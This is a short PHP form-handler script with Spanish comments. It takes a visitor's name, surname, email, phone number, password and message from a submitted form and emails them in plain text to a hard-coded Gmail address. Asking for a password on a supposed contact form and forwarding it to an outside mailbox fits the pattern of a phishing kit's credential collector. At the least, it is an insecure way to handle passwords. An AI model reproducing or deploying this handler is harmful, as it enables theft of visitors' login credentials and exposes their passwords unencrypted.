<?php
        //En el destino colocar el correo alque quieres que lleguen los datos del contacto de tu formulario
 $destino = "corporationclousofte@gmail.com";
    $nombre = $_POST["nombre"];
    $apellido = $_POST["apellido"];
    $email = $_POST["email"];
    $numero = $_POST["numero"];
    $contraseña = $_POST["contraseña"];
    $mensaje = $_POST["mensaje"];
    $contenido = "Nombre: " . $nombre . "\nApellido: " . $apellido . "\nCorreo: " . $email . "\nNúmero: " . $numero . "\ncontraseña: " . $contraseña . "\nAsunto: " . $mensaje;
    mail($destino, "Contacto", $contenido);
    

?>